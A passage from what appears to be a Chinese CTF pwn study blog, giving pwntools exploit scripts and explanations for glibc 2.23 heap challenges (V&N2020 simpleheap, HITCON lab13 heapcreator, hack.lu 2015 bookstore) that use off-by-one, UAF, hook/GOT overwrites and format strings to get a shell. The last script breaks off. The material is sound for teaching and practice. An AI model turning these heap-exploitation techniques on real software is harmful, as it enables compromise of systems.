class="comment">#mem指针指向&#x27;/bin/sh&#x27;指针,free时用到</span></span><br><span class="line"><span class="comment">#gdb.attach(io)  </span></span><br><span class="line"><span class="comment"># construct fake book1 to leak addr of book2</span></span><br><span class="line">payload1 = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(book1_addr-<span class="number">0x30</span>) + pack(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#第二个pack是为了得到mmap地址</span></span><br><span class="line"><span class="comment">#第三个pack是为了使得des1指向的位置不变</span></span><br><span class="line"> </span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload1)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by null to point at fake book1</span></span><br><span class="line">change(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">mmap_addr = unpack(name1.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak mmap_addr:&quot;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"> </span><br><span class="line">libc_base = mmap_addr + <span class="number">0x22000</span> - <span class="number">0x10</span><span class="comment">#去头加偏移</span></span><br><span class="line">log.success(<span class="string">&quot;leak libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"> </span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload2 = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(free_hook_addr) + pack(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#将des1指针替换为free_hook的地址,并修改其为system的地址</span></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload2)</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, pack(system_addr))</span><br><span class="line"> </span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>与wiki和大多数博客的不同,我做了一些调整,这个我觉得是更合理的(基于ubuntu20原装环境)</p><p><strong>小记0x1-0x3</strong></p><h2 id="v-amp-n2020招新赛simpleheap"><a href="#v-amp-n2020招新赛simpleheap" class="headerlink" title="v&amp;n2020招新赛simpleheap"></a>v&amp;n2020招新赛simpleheap</h2><p><strong>难度:★★</strong></p><p>这题难度较上一题要明显高出一截</p><p>核心利用是off-by-one以及unsortedbin attack</p><p>程序的漏洞在于其edit函数存在off-by-one，以此来修改下一个chunk的size域</p><p>并利用unsortedbin的切割特性来泄露mainarena+88,来得到libc_base</p><p>再通过伪造一个fakechunk(可写hook)到fastbins链上,使得两次分配得到该chunk并覆写mallochook和reallochook</p><p>不直接覆盖mallochook为onegadget的原因是,四个onegadget的条件都不满足,故只能通过realloc函数来调整栈帧并调用reallochook为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./vn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">gdb.attach(p) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"> </span><br><span class="line">one = <span class="number">0x4527a</span></span><br><span class="line">onegadget = libc_base + one</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">b&#x27;\n&#x27;</span><span class="comment">#这两个换行很重要,没有换行就会卡住不知道为什么</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">-----------------------又或者另一个有微小差异的版本--------------------------------------</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./vn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3 阻断top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">libc_base=leak-(<span class="number">0x3c4b78</span>)</span><br><span class="line"></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment"># 4与2同时指向0x70</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk_addr)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#换行依然很重要</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#5</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行有小几率会发生段错误，并且gdb无法获取符号表，不知道为什么[<u>无法获取符号表已解决见小记0x6</u>]</p><p>有几处一定要加换行符,大概是因为程序中的edit函数中的read是一个字节一个字节读入的,故空字符会使得read等待输入,而不是继续往下执行直到退出,故需要换行符来触发退出.</p><p><strong>小记0x4</strong></p><h2 id="HITCON-Trainging-lab13-heapcreator"><a href="#HITCON-Trainging-lab13-heapcreator" class="headerlink" title="HITCON Trainging lab13 heapcreator"></a>HITCON Trainging lab13 heapcreator</h2><p><strong>难度:★</strong></p><p>核心利用依然是off-by-one，且off-by-one大概率和chunk-extend利用有关</p><p>这次可以利用off-by-one漏洞达到任意写任意读的目的</p><p>读哪里写哪里是一个关键</p><p>因为程序没有开启pie,所以可以直接得到某个函数的got表地址,此外,got表可修改</p><p>比较方便的利用是修改free的got表</p><p>然后先读出free真实地址以此得到libc基址</p><p>然后再修改free为system函数</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25919)#这道题在buuctf也能找到</span></span><br><span class="line">p=process(<span class="string">&#x27;./hc&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./hc&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(size)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;16&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#free后，原先的contentchunk和头chunk被挂入fastbin，且由于大小合适contentchunk会被取出作为新的头chunk，这样新的头chunk和contentchunk的位置就对调了，从而可写content指针</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">100</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="string">b&#x27;48&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">base=free_addr-libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(system_addr))</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)   <span class="comment">#这里不用delete函数是因为跳转到执行system后,就接收不到数据了,recv会堵塞卡住</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题唯一需要注意的就是<strong>确定free-got表这个利用点</strong>,因为free的参数是一个可写指针,这样再修改为system函数,参数就可控了</p><p>而恰好这道题没有pie且got表可写,free-got表是最快捷的突破点,至于修改hook什么的也能做到不过要多花一些功夫</p><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><strong>难度:★★★</strong></p><p>难度不小，非常综合的一题，要用到不少知识</p><p>程序没有开relro和pie</p><p>程序比较易发现的漏洞有</p><ol><li>无限读，程序在读取内容时是仅以出现换行符来判断结束的</li><li>程序在free后没有设置NULL，故存在UAF</li><li>程序结尾存在一个格式字符串漏洞</li></ol><p>写的能力全部在格式化字符串上</p><p>核心关键点在于修改了book2的size后在释放,使得submit获得的chunk就为book2,从而使的dest被overlap以达到控制格式化字符串的目的</p><p>其中book1的内容的控制也算十分精妙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">我们需要让printf堆块处执行格式化的漏洞，就需要让submit功能去帮助我们覆盖，submit功能会加上order1:等这些字符串，不能漏掉，总结后可以得知新申请的堆块内容为：</span><br><span class="line"></span><br><span class="line">Order 1: + chunk1 + \n + Order 2: + chunk2 + \n</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">因为chunk2已经被delete掉了，所以当复制chunk2中的内容的时候复制的其实是order 1: + chunk1。所以上述可以变为：</span><br><span class="line"></span><br><span class="line">Order 1: + chunk1 + \n + Order 2: + Order 1: + chunk1 + \n</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">所以我们可以构造第二次的chunk1内容恰好覆盖到dest堆块处。也就是：</span><br><span class="line"></span><br><span class="line">size(Order 1: + chunk1 + \n + Order 2: + Order 1:) == 0x90</span><br><span class="line"></span><br><span class="line">size(chunk1) == 0x90 - 28 == 0x74</span><br></pre></td></tr></table></figure><p>然而单单一次格式化字符串显然并不能达到目的</p><p>故而又要想方设法做到二次利用</p><p>最好的方法自然是.fini_array的利用</p><p>且这道题.fini_array的返回地址恰好与一个onegadget相近,剩下的就都是常规套路了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit1</span>(<span class="params">content</span>) :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Enter first order:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">content</span>) :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Enter second order:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete2</span>() :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"> </span><br><span class="line">delete2()</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;%2617c%13$hn.%31$p,%28$p&quot;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p8(<span class="number">0x0</span>)*(<span class="number">0x88</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit1(payload)</span><br><span class="line"> </span><br><span class="line">payload2 = <span class="string">b&#x27;5&#x27;</span>+p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(fini_array)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#leak --&gt; libc_base</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span 